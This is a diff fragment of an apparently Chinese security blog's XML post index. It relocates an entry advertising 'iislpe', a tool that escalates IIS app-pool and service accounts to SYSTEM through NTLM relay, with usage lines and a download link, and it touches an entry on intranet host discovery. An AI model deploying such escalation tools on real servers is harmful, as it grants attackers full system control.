+<p>&nbsp;</p>
+<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
+<p>&nbsp; &nbsp;&nbsp; </p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
+        <tag>IIS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>基于Browser协议探测内网主机</title>
     <url>/p/16b5ff0b.html</url>
     <content><![CDATA[<p>利用Browser协议可获取机器IP、MAC、机器名、操作系统、域，如图</p>
@@ -9249,43 +9278,16 @@ from pprint import pprint
         <category>工具</category>
         <category>主机发现</category>
         <category>源码</category>
-        <category>信息收集</category>
-        <category>Python</category>
-        <category>嗅探</category>
         <category>内网渗透</category>
+        <category>嗅探</category>
+        <category>信息收集</category>
         <category>编程</category>
+        <category>Python</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Code</tag>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>全版本IIS提权工具iislpe</title>
-    <url>/p/6b9b3afe.html</url>
-    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
-<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
-<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
-<p><strong>原理:</strong></p>
-<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
-<p><strong>用法:</strong></p>
-<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
-<p>&nbsp;</p>
-<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
-<p>&nbsp; &nbsp;&nbsp; </p>
-<p>&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
         <tag>Tool</tag>
-        <tag>LPE</tag>
-        <tag>IIS</tag>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
